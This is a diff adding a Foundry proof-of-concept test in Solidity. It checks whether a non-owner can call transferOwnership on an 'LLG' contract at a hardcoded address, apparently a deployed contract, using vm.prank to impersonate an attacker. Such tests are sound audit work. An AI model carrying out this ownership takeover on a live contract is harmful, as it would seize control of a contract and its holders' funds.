@@ -1,0 +1,37 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ILLG {
+    function owner() external view returns (address);
+    function transferOwnership(address newOwner) external;
+    function balanceOf(address account) external view returns (uint256);
+    // Other functions can be added if needed, but not required for the test.
+}
+
+contract ExploitTest is Test {
+    ILLG public constant llg = ILLG(0xE4C293Eadbb9d72d68a680F1A66979726992c396);
+    address public constant ATTACKER = address(0x1337);
+    address public constant VICTIM = address(0xBEEF);
+
+    function testInsufficientAccessControlTransferOwnership() public {
+        // Get the initial owner of the contract.
+        address initialOwner = llg.owner();
+        // Ensure the attacker is not the owner.
+        assertTrue(initialOwner != ATTACKER, "Attacker should not be the initial owner");
+
+        // Impersonate a non-owner address and call transferOwnership.
+        vm.prank(ATTACKER);
+        // This call should succeed if the access control is insufficient.
+        llg.transferOwnership(VICTIM);
+
+        // Verify that ownership has been transferred to the address we specified.
+        address newOwner = llg.owner();
+        assertEq(newOwner, VICTIM, "Ownership should be transferred to VICTIM");
+        // Verify that the old owner is no longer the owner.
+        assertTrue(newOwner != initialOwner, "Old owner should no longer be the owner");
+    }
+}
+```
